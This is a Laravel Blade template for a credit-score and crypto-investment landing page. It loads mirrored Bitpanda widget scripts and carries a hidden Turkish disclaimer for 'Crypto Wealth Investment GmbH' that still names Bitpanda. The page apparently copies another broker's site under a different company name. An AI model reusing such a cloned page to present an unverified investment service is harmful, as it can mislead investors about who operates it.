@include('layouts.partials.header')

    <section id=layout-content tabindex=-1>
        <section class="default uk-padding-remove-bottom uk-section">
            <div class=uk-container>
                <div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid="">
                    
                    <div class=default>
                        <section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m">
                            <div class=module-text__content>
                                <h1>Better Credit Score <br>Better Secured Future</h1>
                            </div>
                            <div class="js-bp3-cta-button module-text__buttons"><span class=primary-button><a class="desktop-button tk-get-started-button uk-button uk-button-large uk-button-primary" href="register"> Get Started </a> <a class="mobile-button tk-get-app-button uk-button uk-button-large uk-button-primary" href="register"> Get Started </a></span> </div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </section>
                    </div>
                    <div class=default>
                        <div class=bp3-hero-ticker__image-container><img alt="Hero ticker" src="resources/1/img/Hero.png"> </div>
                            </div>
                        </div>
                        <script>
                            window.initScriptLater = function(scriptUrl, fallback) {
                                const script = document.createElement("script");
                                script.onload = fallback;
                                script.src = scriptUrl;

                                document.addEventListener("readystatechange", () => {
                                    if (document.readyState === "interactive") {
                                        document.head.appendChild(script);
                                    }
                                });
                            };

                            window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/hero-ticker.minda91.js?id=08a6562cc452f266d797", () =>
                                window.initHeroTicker("1,85,28", ".js-bp3-hero-ticker-1685902989")
                            );

                        </script>
                        
                        <div class="module-steps__footer uk-text-left">
                            <div class="js-bp3-cta-button module-text__buttons"></div>
                            <script>
                                window.initScriptLater = function(scriptUrl, fallback) {
                                    const script = document.createElement("script");
                                    script.onload = fallback;
                                    script.src = scriptUrl;

                                    document.addEventListener("readystatechange", () => {
                                        if (document.readyState === "interactive") {
                                            document.head.appendChild(script);
                                        }
                                    });
                                };

                                window.initScriptLater("resources/cdn.bitpanda.com/app/v2/js/cta-button.minb126.js?id=d34a8a89944479eef669", () =>
                                    window.initCtaButton()
                                );

                            </script>
                        </div>
                    </div>
                </section>
            </div>
        </section>
        <hr class=uk-margin-remove>
        <section class="default footerbanner uk-section" style="display: none;">
            <div class=uk-container>
                <div class=uk-grid>
                    <div class="uk-margin-medium-top uk-text-small">
                        <p><em>Crypto Wealth Investment GmbH ve grup şirketleri (Crypto Wealth Investment) Türk Parasının Kıymetini’nin Korunması Hakkında 32 sayılı Karar’ın 2/b maddesine göre Türkiye’de yerleşik sayılan hiçbir kişiye yönelik olarak 6362 sayılı Sermaye Piyasası Kanunu başta olmak üzere Türkiye Cumhuriyeti Devleti mevzuatı hükümleri gereği Türkiye’de faaliyet izni gerektiren hiçbir sermaye piyasası faaliyetine dair hizmet sunmamaktadır. Şayet Bitpanda’nın yabancı sermaye piyasalarında vermiş olduğu hizmetlerden Türkiye’de yerleşik kişilerin faydalandığı tespit edilecek olursa tüm zararları kullanıcıya ait olmak üzere bu hizmetler ivedilikle sona erdirilecektir.</em>
                    </div>
                </div>
            </div>
        </section>
    </section>
@include('layouts.partials.footer')